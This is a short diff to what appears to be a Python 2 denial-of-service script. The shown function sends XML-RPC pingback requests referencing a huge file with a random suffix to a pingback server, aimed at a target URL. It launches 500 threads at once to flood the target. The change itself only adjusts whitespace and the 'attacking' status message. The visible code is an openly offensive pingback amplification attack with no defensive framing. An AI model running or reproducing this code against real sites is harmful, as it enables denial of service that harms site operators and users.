@@ -27,6 +27,8 @@ def attack():
     server = ServerProxy(pingbackURL)
     try: server.pingback.ping(hugeFile % randint(10,10000000000000), targetURL)
     except: pass
+
 for i in range(500):
     Thread(target=attack).start()
-print "-- attacking --"
+
+print "Attacking..."
